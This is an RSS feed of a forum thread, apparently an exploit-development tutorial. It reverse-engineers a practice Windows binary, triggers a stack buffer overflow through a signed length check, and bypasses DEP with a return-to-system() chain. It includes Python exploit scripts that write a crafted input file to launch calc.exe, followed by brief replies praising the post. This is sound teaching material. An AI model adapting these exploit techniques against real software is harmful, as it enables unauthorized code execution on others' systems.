@@ -1,0 +1,489 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
+  <channel>
+    <title>Bypass Data Execution Protection (DEP)</title>
+    <link>https://0x00sec.org/t/bypass-data-execution-protection-dep/6988</link>
+    <description>Hey folks! this topic details how to overflow a buffer, bypass DEP (Data Execution Prevention) and take control of the executable
+
+## Recommended Prerequisites
+
+* C/C++ language, a basic level would be fine
+* x86 Intel Assembly
+* Familiarity with Buffer Overflow
+* Debuggers/Disassembly
+
+## The binary
+
+[File](https://ufile.io/4dokb) 
+[Virustotal](https://www.virustotal.com/#/file/65d44e69d8b7ef29d3a28819de4774c422f8a88758ee805eb11b2cbc081ec0a2/detection)
+
+Okay, first thing we need to do is see what the executable brings us, so we run it.
+
+![r_opt|500x87](upload://fsZkoiT1A4QlwNxgKozQjjGFbgg.png)
+
+Here we see that it is asking for a file _**file.dat**_ but as it does not exist it tells us that **it cannot be opened**, Once created we see that it shows us a message with 3 values at 0 that seem to correspond to 3 variables (cookie, cookie2 and size) and nothing else.
+
+Since we don&#39;t know what it does, let&#39;s take a look at it. 
+
+![function1_opt(2)|690x317](upload://3vJPoq3QbuuHL7ScLivt0Gg6PDC.png)
+
+This function has 5 variables, 4 of which are initialized at 0 and one at 32h (&quot;2&quot;), there is a pointer to **LoadLibrary** that is stored in 0x10103024 then makes a fopen to &quot;fichero.dat&quot; file in binary read mode, stores the FILE pointer in 0x10103020 and finally checks if it exists, if it does not exist it will go to 0x101010d3 and closes (as we saw before) and if it exists it goes to 0x101010e9, let&#39;s look there
+
+![function2_opt(1)|350x391](upload://oFDpFme9upt3ffYFMo4MJ0ggDG5.png)
+
+Ok, in this procedure it first reads 4 bytes of fichero.dat with **fread** and stores them in a pointer to a block of memory [look](https://www.tutorialspoint.com/c_standard_library/c_function_fread.htm) (**ebp-c**), **fread** returns the total number of elements read and stores it in **ebp-8**, it does fread of 4 bytes again for the file and stores them in a pointer to **ebp-10** then it does it one more time of 1 byte and stores it in a pointer to **ebp-1**, finally it compares this byte with [ebp-14] which is 32h (&quot;2&quot;) and if it is less than or equal (**jle**) it goes to 0x10101155 if it doesn&#39;t, show a message saying &quot;Nos fuimos al carajo&quot; (We&#39;re going to fuck off) and it closes.
+
+Then we write in the file 8 bytes + the correct byte (&quot;2&quot;) and we enter 0x10101155, for example:
+
+&gt; 1234 + 5678 + **2**
+
+![function3_opt|400x300](upload://eA8JSzMDHegRYIaKfejYJ7xiTz9.png)
+
+Well, here it pushes the saved bytes with **fread** and prints them, allocates 50 bytes (32h) of memory with **malloc**, stores the pointer to the allocated memory in **ebp-1c** then push the first 8 bytes of &quot;**fichero.dat**&quot; to 0x10101010, let&#39;s look over there  
+
+![function4_opt|600x253](upload://1h9TMKzfNagNhDwFlymbPqz993n.png)
+
+Okay, what it does here is it takes the first 4 bytes of _fichero.dat_ and adds them to the following 4 bytes then the result is compared to **58552433h**, if the condition is correct, loads &quot;**pepe.dll**&quot;, then let&#39;s make sure the condition is met (as it is _little endian_ we have to put the bytes at backwards)
+
+As not all characters meet the condition as &quot;0&quot; (30h) +&quot;(&quot; (28h) = 58h (1 byte correct) we do a script that does it and ready
+
+```python
+data = &quot;\x21\x1210&quot; + &quot;\x12\x12$(&quot; + &quot;2&quot;
+with open(&quot;fichero.dat&quot;, &quot;w&quot;) as file:
+	file.write(data)
+```
+
+Okay, this must meet the condition, let&#39;s see.
+
+![check58_opt|600x330](upload://93w9YEtENuEQuPxkkCk5dF3HrfI.png)
+
+Well, let&#39;s see what&#39;s it now. 
+
+![buffer_opt|405x369](upload://1K0YQt8SI2FuwBk4jwt0NLUdqTI.png)
+
+Once we leave 0x10101010 we see that it reads [ebp-1] bytes of **fichero.dat** with **fread** and stores it in a buffer pointing to (**ebp-54**), **Okay, here&#39;s a buffer overflow, let&#39;s analyze it.**
+
+First we saw that the ninth byte of &quot;**fichero.dat**&quot; was stored in **[ebp-1]**, then compared to **[ebp-14] (&quot;2&quot;)**
+
+![anal1_opt(1)|405x239](upload://o4ZaCLRUV164loEyk1lz5zc0FLq.png)
+
+Well, now we see that that byte (**[ebp-1]**) is used as size of **fread** that will store that number of bytes (size) in a buffer (**ebp-54**) of 52 bytes, as the nearest variable is **ebp-20**, [ebp-54] - [ebp-20] = [ebp-34], so 34h (52d), we can also see it in the IDA stack, _right click_ -&gt; _array_ -&gt; _ok_
+
+![buffer_opt(1)|405x369](upload://wi0uLWHKXzNQrctiOQ3SIORoLng.png)
+
+![idastack_opt(1)|405x375](upload://4QVQi1ZsAWTfhNTkgIeozcEUjRC.png)
+
+Okay, knowing all that, how could we overflow the buffer?
+
+**[ebp-1]** is the ninth byte of **fichero.dat**, the size of **fread** for store in the buffer **[ebp-54]** and must also be less than or equal to 32h (&quot;2&quot;).
+
+So we know that negative numbers in hexadecimal are higher in decimal, so if we put a negative number in hexadecimal it would allow us to enter more bytes than allowed (52d) and this is because it is signed (**jle**)
+
+    0x10101139 movsx ecx,  byte ptr ss:[ebp-1]
+    0x1010113d cmp ecx,    dword ptr ss:[ebp-14]
+    0x10101140 jle         stack9b.10101155
+
+Let&#39;s try to get to the edge of the buffer and at the same time overflowing 2 bytes of the **fread** stipulation **(50 bytes, 32h)**.
+
+```python
+data = &quot;\x21\x1210&quot; + &quot;\x12\x12$(&quot; + &quot;\xff&quot; + &quot;A&quot; * 52
+
+with open(&quot;fichero.dat&quot;, &quot;w&quot;) as file:
+	file.write(data)
+```
+![ff_opt|405x175](upload://yEjTYytrBpoizGxjHTQ6ysqYCIL.png)
+![ffstack_opt|360x266](upload://A2rn74xZke3E3EkFn1TiPxPG7Nk.png)
+
+**Cool!!!** Let&#39;s see what else there is to see if we can control the **retn**.
+
+Well, now there is a procedure where it copy the buffer bytes **[ebp-54]** for the block in memory allocated by malloc **[ebp-1c]**
+
+![nowrite_opt(1)|690x402](upload://l5CP9jwU5xtGsiGUHh5LtJaFoIO.png)
+
+So, if I fill out **[ebp-1c]** with **&quot;\x41x41x41\x41&quot;** he won&#39;t be able to write because it&#39;s not a valid address, let&#39;s find one that is.
+
+![ywrite_opt|600x137](upload://6yOphatOisdi5mKfsOUNpS5S9HT.png)
+
+All right, let&#39;s check the stack, see how many bytes it takes to get to the start of **retn** and control it.
+
+![88b_opt|600x460](upload://gUmopEQNuadZcWG0ajcgyUlu0p7.png)
+
+Okay, let&#39;s set up our exploit
+
+```python
+import subprocess
+
+shellcode =&quot;\xB8\x40\x50\x03\x78\xC7\x40\x04&quot;+ &quot;calc&quot; + &quot;\x83\xC0\x04\x50\x68\x24\x98\x01\x78\x59\xFF\xD1&quot;
+
+buff = &quot;\x41&quot; * 52
+ebp_20 = &quot;\x41&quot; * 4
+ebp_1c = &quot;\x30\x30\x10\x10&quot;    # Address with write permission
+ebp_18 = &quot;\x41&quot; * 4
+ebp_14 = &quot;\x41&quot; * 4
+ebp_10 = &quot;\x41&quot; * 4
+ebp_c = &quot;\x41&quot; * 4
+ebp_8 = &quot;\x41&quot; * 4
+ebp_4 = &quot;\x41&quot; * 4
+s = &quot;\x41&quot; * 4    # ebp
+r = shellcode
+
+
+data = &quot;\x21\x1210&quot; + &quot;\x12\x12$(&quot; + &quot;\xff&quot; + buff + ebp_20 + ebp_1c + ebp_18 + ebp_14 + ebp_10 + ebp_c + ebp_8 + ebp_4 + s + r
+
+with open(&quot;fichero.dat&quot;, &quot;w&quot;) as file:
+	file.write(data)
+
+subprocess.call(r&quot;stack9b.exe&quot;)
+```
+
+![stack_opt|690x329](upload://ocNoegAKYfH4niKqNtkUZgXSBS4.png)
+![idaex_opt|690x195](upload://2iEzATDjtdUSlJk5U8qQJAg9Cmb.png)
+![pe_opt(1)|690x277](upload://lFOzgrHDAlgKDEigkfKrQNtat7N.png)
+
+Well, we already have EIP under control but now it doesn&#39;t allow me to execute my shellcode, this is due to **DEP** (data execution prevention). 
+
+_Summarizing up, DEP changes the permissions of the segments where data is stored to prevent us from executing code there   -ricnar_
+
+So to bypass the DEP we can do **ROP** (return oriented programming) which is basically using gadgets that are program&#39;s executable code to change the stack permissions with some api like **VirtualProtect** or **VirtualAlloc**
+
+Looking for gadgets in **pepe.dll** I couldn&#39;t find VirtualAlloc, but there is a pointer to **system()** , would only be missing a return that can be **exit()** and a fixed place that we can control to pass it a string to system()
+
+![system_opt(1)|500x270](upload://7myXrH1XyIzaq5QNka1KxltAOGr.png)
+![exit_opt|500x55](upload://mgeKB6YwmVjl4LSbUDMajQ2sZ2t.png)
+
+Now only the string for system() would be missing, we can use the address with write permission
+
+![calc_opt(1)|600x82](upload://6DU6eldeB03SW5pXOdV3AcJZzVs.png)
+
+Here I set up the stack because **malloc** only assigned 50 bytes and then had no control over the eip and that&#39;s how the exploit would look.
+
+![good_opt|690x310](upload://rIfeSUukjw2ha9F8FMq4fXLB280.png)
+
+```python
+import subprocess
+
+system = &quot;\x24\x98\x01\x78&quot;    # system()
+calc = &quot;calc.exe&quot;
+
+buff = &quot;\x41&quot; * 42
+#ebp_20 = &quot;\x41&quot; * 4
+ebp_1c = &quot;\x30\x30\x10\x10&quot;    # Address with write permission
+ebp_18 = &quot;\x41&quot; * 4
+ebp_14 = &quot;\x41&quot; * 4
+ebp_10 = &quot;\x41&quot; * 4
+ebp_c = &quot;\x41&quot; * 4
+ebp_8 = &quot;\x41&quot; * 4
+ebp_4 = &quot;\x41&quot; * 4
+s = &quot;\x41&quot; * 4    # ebp
+r = system
+exit = &quot;\x78\x1d\x10\x10&quot;    # exit()
+ptr_calc = &quot;\x5a\x30\x10\x10&quot;
+
+
+
+data = &quot;\x21\x1210&quot; + &quot;\x12\x12$(&quot; + &quot;\xff&quot; + buff + calc + &quot;\x41&quot; * 6 +  ebp_1c + ebp_18 + ebp_14 + ebp_10 + ebp_c + ebp_8 + ebp_4 + s + r + exit + ptr_calc
+
+with open(&quot;fichero.dat&quot;, &quot;w&quot;) as file:
+	file.write(data)
+
+subprocess.call(r&quot;stack9b.exe&quot;)
+```
+
+![WO_opt|690x330](upload://3nOVflwi6BkMO1glJmUirb7Hw2m.png)</description>
+    
+    <lastBuildDate>Thu, 21 Jun 2018 11:06:26 +0000</lastBuildDate>
+    <category>Exploit Development</category>
+    <atom:link href="https://0x00sec.org/t/bypass-data-execution-protection-dep/6988.rss" rel="self" type="application/rss+xml" />
+      <item>
+        <title>Bypass Data Execution Protection (DEP)</title>
+        <dc:creator><![CDATA[system]]></dc:creator>
+        <description><![CDATA[
+            <p>This topic was automatically closed after 30 days. New replies are no longer allowed.</p>
+          <p><a href="https://0x00sec.org/t/bypass-data-execution-protection-dep/6988/13">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/bypass-data-execution-protection-dep/6988/13</link>
+        <pubDate>Thu, 05 Jul 2018 11:20:00 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-6988-13</guid>
+        <source url="https://0x00sec.org/t/bypass-data-execution-protection-dep/6988.rss">Bypass Data Execution Protection (DEP)</source>
+      </item>
+      <item>
+        <title>Bypass Data Execution Protection (DEP)</title>
+        <dc:creator><![CDATA[alias]]></dc:creator>
+        <description><![CDATA[
+            <p>+1, very well written.</p>
+          <p><a href="https://0x00sec.org/t/bypass-data-execution-protection-dep/6988/12">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/bypass-data-execution-protection-dep/6988/12</link>
+        <pubDate>Thu, 21 Jun 2018 11:06:26 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-6988-12</guid>
+        <source url="https://0x00sec.org/t/bypass-data-execution-protection-dep/6988.rss">Bypass Data Execution Protection (DEP)</source>
+      </item>
+      <item>
+        <title>Bypass Data Execution Protection (DEP)</title>
+        <dc:creator><![CDATA[bluretrece]]></dc:creator>
+        <description><![CDATA[
+            <p>Gracias por el aporte, compa! <img src="https://0x00sec.org/images/emoji/twitter/smiley.png?v=9" title=":smiley:" class="emoji" alt=":smiley:"></p>
+          <p><a href="https://0x00sec.org/t/bypass-data-execution-protection-dep/6988/11">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/bypass-data-execution-protection-dep/6988/11</link>
+        <pubDate>Wed, 20 Jun 2018 20:46:40 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-6988-11</guid>
+        <source url="https://0x00sec.org/t/bypass-data-execution-protection-dep/6988.rss">Bypass Data Execution Protection (DEP)</source>
+      </item>
+      <item>
+        <title>Bypass Data Execution Protection (DEP)</title>
+        <dc:creator><![CDATA[AdwareHunter]]></dc:creator>
+        <description><![CDATA[
+            <p>Fantastic article! Very well-written. Complete, Concise, and easy to understand. Please keep up the great work!</p>
+          <p><a href="https://0x00sec.org/t/bypass-data-execution-protection-dep/6988/10">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/bypass-data-execution-protection-dep/6988/10</link>
+        <pubDate>Fri, 08 Jun 2018 10:24:03 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-6988-10</guid>
+        <source url="https://0x00sec.org/t/bypass-data-execution-protection-dep/6988.rss">Bypass Data Execution Protection (DEP)</source>
+      </item>
+      <item>
+        <title>Bypass Data Execution Protection (DEP)</title>
+        <dc:creator><![CDATA[mcpwn84]]></dc:creator>
+        <description><![CDATA[
+            <p>Nice post, thanks for sharing.</p>
+<p>Copado encontrarse con gente hispana. Saludos <img src="https://0x00sec.org/images/emoji/twitter/wink.png?v=9" title=":wink:" class="emoji" alt=":wink:"></p>
+          <p><a href="https://0x00sec.org/t/bypass-data-execution-protection-dep/6988/9">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/bypass-data-execution-protection-dep/6988/9</link>
+        <pubDate>Thu, 07 Jun 2018 20:01:24 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-6988-9</guid>
+        <source url="https://0x00sec.org/t/bypass-data-execution-protection-dep/6988.rss">Bypass Data Execution Protection (DEP)</source>
+      </item>
+      <item>
+        <title>Bypass Data Execution Protection (DEP)</title>
+        <dc:creator><![CDATA[Atentacle]]></dc:creator>
+        <description><![CDATA[
+            <p>Hostias el narvaja. Mercis!</p>
+          <p><a href="https://0x00sec.org/t/bypass-data-execution-protection-dep/6988/8">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/bypass-data-execution-protection-dep/6988/8</link>
+        <pubDate>Thu, 07 Jun 2018 19:11:50 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-6988-8</guid>
+        <source url="https://0x00sec.org/t/bypass-data-execution-protection-dep/6988.rss">Bypass Data Execution Protection (DEP)</source>
+      </item>
+      <item>
+        <title>Bypass Data Execution Protection (DEP)</title>
+        <dc:creator><![CDATA[Sk0xic]]></dc:creator>
+        <description><![CDATA[
+            <p>Claro que sí, <a href="http://ricardonarvaja.info/WEB/EXPLOITING/" rel="nofollow noopener">http://ricardonarvaja.info/WEB/EXPLOITING/</a></p>
+          <p><a href="https://0x00sec.org/t/bypass-data-execution-protection-dep/6988/7">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/bypass-data-execution-protection-dep/6988/7</link>
+        <pubDate>Thu, 07 Jun 2018 16:20:22 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-6988-7</guid>
+        <source url="https://0x00sec.org/t/bypass-data-execution-protection-dep/6988.rss">Bypass Data Execution Protection (DEP)</source>
+      </item>
+      <item>
+        <title>Bypass Data Execution Protection (DEP)</title>
+        <dc:creator><![CDATA[johnmarston]]></dc:creator>
+        <description><![CDATA[
+            <p>Nice explanation! This actually helped clear some things up for me when it comes to ROP</p>
+          <p><a href="https://0x00sec.org/t/bypass-data-execution-protection-dep/6988/6">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/bypass-data-execution-protection-dep/6988/6</link>
+        <pubDate>Thu, 07 Jun 2018 13:10:56 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-6988-6</guid>
+        <source url="https://0x00sec.org/t/bypass-data-execution-protection-dep/6988.rss">Bypass Data Execution Protection (DEP)</source>
+      </item>
+      <item>
+        <title>Bypass Data Execution Protection (DEP)</title>
+        <dc:creator><![CDATA[Atentacle]]></dc:creator>
+        <description><![CDATA[
+            <p>There’s the exploit-excercises website, it’s pretty good, done a few of them.</p>
+          <p><a href="https://0x00sec.org/t/bypass-data-execution-protection-dep/6988/5">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/bypass-data-execution-protection-dep/6988/5</link>
+        <pubDate>Thu, 07 Jun 2018 11:17:47 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-6988-5</guid>
+        <source url="https://0x00sec.org/t/bypass-data-execution-protection-dep/6988.rss">Bypass Data Execution Protection (DEP)</source>
+      </item>
+      <item>
+        <title>Bypass Data Execution Protection (DEP)</title>
+        <dc:creator><![CDATA[panic_monster]]></dc:creator>
+        <description><![CDATA[
+            <p>Awesome tutorials on the exploit development category.</p>
+<p>Can we also have challenges on these topics, that would allow us to practice these concepts hands on.</p>
+          <p><a href="https://0x00sec.org/t/bypass-data-execution-protection-dep/6988/4">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/bypass-data-execution-protection-dep/6988/4</link>
+        <pubDate>Thu, 07 Jun 2018 09:03:31 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-6988-4</guid>
+        <source url="https://0x00sec.org/t/bypass-data-execution-protection-dep/6988.rss">Bypass Data Execution Protection (DEP)</source>
+      </item>
+      <item>
+        <title>Bypass Data Execution Protection (DEP)</title>
+        <dc:creator><![CDATA[Atentacle]]></dc:creator>
+        <description><![CDATA[
+            <p>Dank!</p>
+<p>¿De donde has sacado el programa ( si se puede saber )? ¿Lo encontraste por casualidad?</p>
+<p>Hoping to see more content like this, and happy to see a spanish fellow around here <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
+          <p><a href="https://0x00sec.org/t/bypass-data-execution-protection-dep/6988/3">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/bypass-data-execution-protection-dep/6988/3</link>
+        <pubDate>Thu, 07 Jun 2018 07:04:11 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-6988-3</guid>
+        <source url="https://0x00sec.org/t/bypass-data-execution-protection-dep/6988.rss">Bypass Data Execution Protection (DEP)</source>
+      </item>
+      <item>
+        <title>Bypass Data Execution Protection (DEP)</title>
+        <dc:creator><![CDATA[ricksanchez]]></dc:creator>
+        <description><![CDATA[
+            <p>Ay nice! That’s basically the windows counterpart  to my <a href="https://0x00sec.org/t/exploit-mitigation-techniques-data-execution-prevention-dep">exploit mitigation series (DEP edition)</a>.</p>
+<p>Nice to see both sides covered now.</p>
+          <p><a href="https://0x00sec.org/t/bypass-data-execution-protection-dep/6988/2">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/bypass-data-execution-protection-dep/6988/2</link>
+        <pubDate>Wed, 06 Jun 2018 11:37:39 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-6988-2</guid>
+        <source url="https://0x00sec.org/t/bypass-data-execution-protection-dep/6988.rss">Bypass Data Execution Protection (DEP)</source>
+      </item>
+      <item>
+        <title>Bypass Data Execution Protection (DEP)</title>
+        <dc:creator><![CDATA[Sk0xic]]></dc:creator>
+        <description><![CDATA[
+            <p>Hey folks! this topic details how to overflow a buffer, bypass DEP (Data Execution Prevention) and take control of the executable</p>
+<h2>Recommended Prerequisites</h2>
+<ul>
+<li>C/C++ language, a basic level would be fine</li>
+<li>x86 Intel Assembly</li>
+<li>Familiarity with Buffer Overflow</li>
+<li>Debuggers/Disassembly</li>
+</ul>
+<h2>The binary</h2>
+<p><a href="https://ufile.io/4dokb" rel="noopener nofollow ugc">File</a><br>
+<a href="https://www.virustotal.com/#/file/65d44e69d8b7ef29d3a28819de4774c422f8a88758ee805eb11b2cbc081ec0a2/detection" rel="noopener nofollow ugc">Virustotal</a></p>
+<p>Okay, first thing we need to do is see what the executable brings us, so we run it.</p>
+<p><img src="//0x00sec.s3.amazonaws.com/original/2X/6/6c6781b77c5c3f335a688b69925f81776db4a4d4.png" alt="r_opt" data-base62-sha1="fsZkoiT1A4QlwNxgKozQjjGFbgg" width="500" height="87"></p>
+<p>Here we see that it is asking for a file <em><strong>file.dat</strong></em> but as it does not exist it tells us that <strong>it cannot be opened</strong>, Once created we see that it shows us a message with 3 values at 0 that seem to correspond to 3 variables (cookie, cookie2 and size) and nothing else.</p>
+<p>Since we don’t know what it does, let’s take a look at it.</p>
+<p><img src="//0x00sec.s3.amazonaws.com/original/2X/1/189cffd80d6fe5cf6ac2b791651f8f142bc1d574.png" alt="function1_opt(2)" data-base62-sha1="3vJPoq3QbuuHL7ScLivt0Gg6PDC" width="690" height="317"></p>
+<p>This function has 5 variables, 4 of which are initialized at 0 and one at 32h (“2”), there is a pointer to <strong>LoadLibrary</strong> that is stored in 0x10103024 then makes a fopen to “fichero.dat” file in binary read mode, stores the FILE pointer in 0x10103020 and finally checks if it exists, if it does not exist it will go to 0x101010d3 and closes (as we saw before) and if it exists it goes to 0x101010e9, let’s look there</p>
+<p><img src="//0x00sec.s3.amazonaws.com/original/2X/a/ace90a9e6bd64f3dcc7bf3fb3277f029b572f38d.png" alt="function2_opt(1)" data-base62-sha1="oFDpFme9upt3ffYFMo4MJ0ggDG5" width="350" height="391"></p>
+<p>Ok, in this procedure it first reads 4 bytes of fichero.dat with <strong>fread</strong> and stores them in a pointer to a block of memory <a href="https://www.tutorialspoint.com/c_standard_library/c_function_fread.htm" rel="noopener nofollow ugc">look</a> (<strong>ebp-c</strong>), <strong>fread</strong> returns the total number of elements read and stores it in <strong>ebp-8</strong>, it does fread of 4 bytes again for the file and stores them in a pointer to <strong>ebp-10</strong> then it does it one more time of 1 byte and stores it in a pointer to <strong>ebp-1</strong>, finally it compares this byte with [ebp-14] which is 32h (“2”) and if it is less than or equal (<strong>jle</strong>) it goes to 0x10101155 if it doesn’t, show a message saying “Nos fuimos al carajo” (We’re going to fuck off) and it closes.</p>
+<p>Then we write in the file 8 bytes + the correct byte (“2”) and we enter 0x10101155, for example:</p>
+<blockquote>
+<p>1234 + 5678 + <strong>2</strong></p>
+</blockquote>
+<p><img src="//0x00sec.s3.amazonaws.com/original/2X/6/66344b19febddcfbd31ab399baa3b94aa2115d3f.png" alt="function3_opt" data-base62-sha1="eA8JSzMDHegRYIaKfejYJ7xiTz9" width="400" height="300"></p>
+<p>Well, here it pushes the saved bytes with <strong>fread</strong> and prints them, allocates 50 bytes (32h) of memory with <strong>malloc</strong>, stores the pointer to the allocated memory in <strong>ebp-1c</strong> then push the first 8 bytes of “<strong>fichero.dat</strong>” to 0x10101010, let’s look over there</p>
+<p><img src="//0x00sec.s3.amazonaws.com/original/2X/0/08f2bede9b3867bfb9e1a8f81799d69c2ccb36dd.png" alt="function4_opt" data-base62-sha1="1h9TMKzfNagNhDwFlymbPqz993n" width="600" height="253"></p>
+<p>Okay, what it does here is it takes the first 4 bytes of <em>fichero.dat</em> and adds them to the following 4 bytes then the result is compared to <strong>58552433h</strong>, if the condition is correct, loads “<strong>pepe.dll</strong>”, then let’s make sure the condition is met (as it is <em>little endian</em> we have to put the bytes at backwards)</p>
+<p>As not all characters meet the condition as “0” (30h) +"(" (28h) = 58h (1 byte correct) we do a script that does it and ready</p>
+<pre><code class="lang-python">data = "\x21\x1210" + "\x12\x12$(" + "2"
+with open("fichero.dat", "w") as file:
+	file.write(data)
+</code></pre>
+<p>Okay, this must meet the condition, let’s see.</p>
+<p><img src="//0x00sec.s3.amazonaws.com/original/2X/3/3f79643fd69aef534b59525d0d1fa1049a4f78b2.png" alt="check58_opt" data-base62-sha1="93w9YEtENuEQuPxkkCk5dF3HrfI" width="600" height="330"></p>
+<p>Well, let’s see what’s it now.</p>
+<p><img src="//0x00sec.s3.amazonaws.com/original/2X/0/0c35cb19c480d636f73bf8fc4a4d8f683528495e.png" alt="buffer_opt" data-base62-sha1="1K0YQt8SI2FuwBk4jwt0NLUdqTI" width="405" height="369"></p>
+<p>Once we leave 0x10101010 we see that it reads [ebp-1] bytes of <strong>fichero.dat</strong> with <strong>fread</strong> and stores it in a buffer pointing to (<strong>ebp-54</strong>), <strong>Okay, here’s a buffer overflow, let’s analyze it.</strong></p>
+<p>First we saw that the ninth byte of “<strong>fichero.dat</strong>” was stored in <strong>[ebp-1]</strong>, then compared to <strong>[ebp-14] (“2”)</strong></p>
+<p><img src="//0x00sec.s3.amazonaws.com/original/2X/a/a8c47addb12b881b4bdc6f32661b908e2dbc6e40.png" alt="anal1_opt(1)" data-base62-sha1="o4ZaCLRUV164loEyk1lz5zc0FLq" width="405" height="239"></p>
+<p>Well, now we see that that byte (<strong>[ebp-1]</strong>) is used as size of <strong>fread</strong> that will store that number of bytes (size) in a buffer (<strong>ebp-54</strong>) of 52 bytes, as the nearest variable is <strong>ebp-20</strong>, [ebp-54] - [ebp-20] = [ebp-34], so 34h (52d), we can also see it in the IDA stack, <em>right click</em> -&gt; <em>array</em> -&gt; <em>ok</em></p>
+<p><img src="//0x00sec.s3.amazonaws.com/original/2X/e/e24eb0196e97a1b89f9bad6d8e7cce4d86f2feae.png" alt="buffer_opt(1)" data-base62-sha1="wi0uLWHKXzNQrctiOQ3SIORoLng" width="405" height="369"></p>
+<p><img src="//0x00sec.s3.amazonaws.com/original/2X/2/22047c33464df41a61806cb2db7c255de0f6d448.png" alt="idastack_opt(1)" data-base62-sha1="4QVQi1ZsAWTfhNTkgIeozcEUjRC" width="405" height="375"></p>
+<p>Okay, knowing all that, how could we overflow the buffer?</p>
+<p><strong>[ebp-1]</strong> is the ninth byte of <strong>fichero.dat</strong>, the size of <strong>fread</strong> for store in the buffer <strong>[ebp-54]</strong> and must also be less than or equal to 32h (“2”).</p>
+<p>So we know that negative numbers in hexadecimal are higher in decimal, so if we put a negative number in hexadecimal it would allow us to enter more bytes than allowed (52d) and this is because it is signed (<strong>jle</strong>)</p>
+<pre><code>0x10101139 movsx ecx,  byte ptr ss:[ebp-1]
+0x1010113d cmp ecx,    dword ptr ss:[ebp-14]
+0x10101140 jle         stack9b.10101155
+</code></pre>
+<p>Let’s try to get to the edge of the buffer and at the same time overflowing 2 bytes of the <strong>fread</strong> stipulation <strong>(50 bytes, 32h)</strong>.</p>
+<pre><code class="lang-python">data = "\x21\x1210" + "\x12\x12$(" + "\xff" + "A" * 52
+
+with open("fichero.dat", "w") as file:
+	file.write(data)
+</code></pre>
+<p><img src="//0x00sec.s3.amazonaws.com/original/2X/f/f2d8bc728b116fe39fac839fa6c2d944c917452f.png" alt="ff_opt" data-base62-sha1="yEjTYytrBpoizGxjHTQ6ysqYCIL" width="405" height="175"><br>
+<img src="//0x00sec.s3.amazonaws.com/original/2X/f/fc94ea6662ffc8da6d8b0e3b01d16d4cd75b898e.png" alt="ffstack_opt" data-base62-sha1="A2rn74xZke3E3EkFn1TiPxPG7Nk" width="360" height="266"></p>
+<p><strong>Cool!!!</strong> Let’s see what else there is to see if we can control the <strong>retn</strong>.</p>
+<p>Well, now there is a procedure where it copy the buffer bytes <strong>[ebp-54]</strong> for the block in memory allocated by malloc <strong>[ebp-1c]</strong></p>
+<p><img src="//0x00sec.s3.amazonaws.com/original/2X/9/93d0775b279dd23af7795c045a30c39435be3ab2.png" alt="nowrite_opt(1)" data-base62-sha1="l5CP9jwU5xtGsiGUHh5LtJaFoIO" width="690" height="402"></p>
+<p>So, if I fill out <strong>[ebp-1c]</strong> with <strong>“\x41x41x41\x41”</strong> he won’t be able to write because it’s not a valid address, let’s find one that is.</p>
+<p><img src="//0x00sec.s3.amazonaws.com/original/2X/2/2dfc792951337d64ee81486726061ae00e7ed565.png" alt="ywrite_opt" data-base62-sha1="6yOphatOisdi5mKfsOUNpS5S9HT" width="600" height="137"></p>
+<p>All right, let’s check the stack, see how many bytes it takes to get to the start of <strong>retn</strong> and control it.</p>
+<p><img src="//0x00sec.s3.amazonaws.com/original/2X/7/7681c7aac081636d910c82cbb720d7ecd2b49ff5.png" alt="88b_opt" data-base62-sha1="gUmopEQNuadZcWG0ajcgyUlu0p7" width="600" height="460"></p>
+<p>Okay, let’s set up our exploit</p>
+<pre><code class="lang-python">import subprocess
+
+shellcode ="\xB8\x40\x50\x03\x78\xC7\x40\x04"+ "calc" + "\x83\xC0\x04\x50\x68\x24\x98\x01\x78\x59\xFF\xD1"
+
+buff = "\x41" * 52
+ebp_20 = "\x41" * 4
+ebp_1c = "\x30\x30\x10\x10"    # Address with write permission
+ebp_18 = "\x41" * 4
+ebp_14 = "\x41" * 4
+ebp_10 = "\x41" * 4
+ebp_c = "\x41" * 4
+ebp_8 = "\x41" * 4
+ebp_4 = "\x41" * 4
+s = "\x41" * 4    # ebp
+r = shellcode
+
+
+data = "\x21\x1210" + "\x12\x12$(" + "\xff" + buff + ebp_20 + ebp_1c + ebp_18 + ebp_14 + ebp_10 + ebp_c + ebp_8 + ebp_4 + s + r
+
+with open("fichero.dat", "w") as file:
+	file.write(data)
+
+subprocess.call(r"stack9b.exe")
+</code></pre>
+<p><img src="//0x00sec.s3.amazonaws.com/original/2X/a/a9a67cdb72adf827e5b5e409ccbde82b00fdf3ec.png" alt="stack_opt" data-base62-sha1="ocNoegAKYfH4niKqNtkUZgXSBS4" width="690" height="329"><br>
